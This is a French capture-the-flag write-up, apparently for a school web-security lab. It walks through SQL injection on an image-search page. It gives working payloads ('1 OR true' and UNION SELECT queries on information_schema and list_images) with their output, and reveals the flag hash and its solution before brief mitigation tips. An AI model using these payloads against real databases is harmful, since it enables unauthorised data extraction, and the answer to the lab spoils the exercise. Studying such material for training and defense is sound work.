# Injection SQL SEARCH IMAGE

Dans l'onglet SEARCH IMAGE : http://IP/?page=searchimg

L'injection SQL est une méthodes d'exploitation de faille de sécurité d'une application interagissant avec une base de données. Elle permet d'injecter dans la requête SQL en cours un morceau de requête non prévu par le système et pouvant en compromettre la sécurité.

En tapant la commande SQL : `1 OR true`

Nous pouvons voir toutes les **listes_images** créé :
```
| Title            | URL                                             |
|------------------|-------------------------------------------------|
| Nsa              | https://fr.wikipedia.org/wiki/Programme_        |
| 42 !             | https://fr.wikipedia.org/wiki/Fichier:42        |
| Google           | https://fr.wikipedia.org/wiki/Logo_de_Go        |
| Earth            | https://en.wikipedia.org/wiki/Earth#/med        |
| Hack me ?        | borntosec.ddns.net/images.png                   |
```

Nous allons faire la commande SQL suivantes pour afficher toutes les tables et colonnes associé :`1 UNION SELECT table_name, column_name FROM information_schema.columns`

On va s'intéresser à la table **list_images** :

**LIST_IMAGES**(*id, url, title, comment*)

Nous allons afficher les valeurs de title et comment grâce à la commande SQL : `1 UNION SELECT comment, title FROM list_images`

Ce qui nous donne les valeurs suivantes :

```
Title: Hack me ?
Url : If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
```

Si on déchiffre le code `1928e8083cf461a51303633093573c46` en **MD5** on obtient albatroz, et si on le chiffre en **SHA256** on obtient : f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188


### Comment protéger vos bases de données d’une injection SQL

- Vérifier la saisie utilisateur, les données remises devraient toujours être en accord avec le type de données attendu.
- Échapper les caractères spéciaux à l’aide de mysqli_real_escape_string() ou autres fonctions.
- Préférer l’utilisation de comptes utilisateurs à accès limité pour empêcher la modification ou suppression d’éléments de la base de données.
